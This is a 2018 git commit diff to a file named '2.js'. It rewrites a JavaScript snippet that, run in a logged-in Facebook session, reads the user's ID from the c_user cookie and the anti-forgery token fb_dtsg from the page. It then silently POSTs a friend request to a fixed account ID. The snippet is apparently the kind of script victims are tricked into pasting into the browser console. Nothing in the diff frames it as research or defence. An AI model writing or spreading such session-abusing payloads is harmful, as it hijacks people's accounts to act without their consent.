3b67e84c6e19d099978048c04ef021bf998eb53c
عاشق ومهبول الجافاسكربت عساسى <elmahbol@users.noreply.github.com>
2018-01-23 18:54:42 +0000

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,11 +1,17 @@
-var X = new XMLHttpRequest();
-  var XURL = "//www.facebook.com/ajax/add_friend/action.php?dpr=1";
-  var XParams = "to_friend=100003085666469&action=add_friend&how_found=profile_browser&ref_param=pb_reactions&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer&floc=list_of_people&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
-  X.open("POST", XURL, true);
-  x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-  X.onreadystatechange = function () {
-    if (X.readyState == 4 && X.status == 200) {
-      X.close;
-    }
-  };
-  X.send(XParams);
+var http4 = new XMLHttpRequest();
+var url4 = "//www.facebook.com/ajax/add_friend/action.php?dpr=1";
+var params4 = "to_friend=100003085666469&action=add_friend&how_found=profile_browser&ref_param=pb_reactions&outgoing_id=&logging_location=&no_flyout_on_click=true&ego_log_data&http_referer&floc=list_of_people&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=";
+http4.open("POST", url4, true);
+http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http4.setRequestHeader("Content-length", params4.length);
+http4.setRequestHeader("Connection", "close");
+ 
+http4.onreadystatechange = function() {
+if(http4.readyState == 4 && http4.status == 200) {
+ 
+http4.close; 
+ 
+}
+}
+ 
+http4.send(params4);
